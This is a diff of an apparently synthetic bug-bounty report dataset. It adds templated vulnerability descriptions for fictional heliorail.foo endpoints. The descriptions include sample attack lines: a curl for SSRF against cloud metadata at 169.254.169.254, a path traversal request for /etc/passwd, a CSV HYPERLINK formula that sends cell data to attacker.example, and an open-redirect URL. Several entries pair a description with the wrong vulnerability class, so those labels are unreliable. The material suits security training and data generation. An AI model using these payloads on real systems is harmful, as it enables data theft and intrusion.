+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.heliorail.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15232,7 +15346,8 @@
           "offset": "6d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.heliorail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15371,7 +15486,8 @@
           "offset": "7d 15h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.heliorail.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15522,7 +15638,8 @@
           "offset": "5d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dash.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15661,7 +15778,8 @@
           "offset": "9d 3h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.heliorail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15797,7 +15915,8 @@
           "offset": "6d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.heliorail.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15912,7 +16031,8 @@
           "offset": "5d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16040,7 +16160,8 @@
           "offset": "18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dash.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16171,7 +16292,8 @@
           "offset": "9d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16290,7 +16412,8 @@
           "offset": "5d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.heliorail.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16422,7 +16545,8 @@
           "offset": "8d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.heliorail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16507,7 +16631,8 @@
           "offset": "3d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.heliorail.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16636,7 +16761,8 @@
           "offset": "3d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dash.heliorail.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16772,7 +16898,8 @@
           "offset": "8d 5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16875,7 +17002,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16962,7 +17090,8 @@
           "offset": "6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.heliorail.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17113,7 +17242,8 @@
           "offset": "4d 4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -17281,7 +17411,8 @@
           "offset": "7d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.heliorail.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17433,7 +17564,8 @@
           "offset": "8d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17568,7 +17700,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dash.heliorail.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17716,7 +17849,8 @@
           "offset": "7d 3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.heliorail.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17843,7 +17977,8 @@
           "offset": "6d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17929,7 +18064,8 @@
           "offset": "1d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18059,7 +18195,8 @@
           "offset": "6d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dash.heliorail.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18201,7 +18338,8 @@
           "offset": "5d 15h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://dash.heliorail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18308,7 +18446,8 @@
           "offset": "23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18459,7 +18598,8 @@
           "offset": "6d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18578,7 +18718,8 @@
           "offset": "4d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18730,7 +18871,8 @@
           "offset": "9d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18869,7 +19011,8 @@
           "offset": "2d 22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.heliorail.foo/import`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19025,7 +19168,8 @@
           "offset": "6d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dash.heliorail.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19144,7 +19288,8 @@
           "offset": "4d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
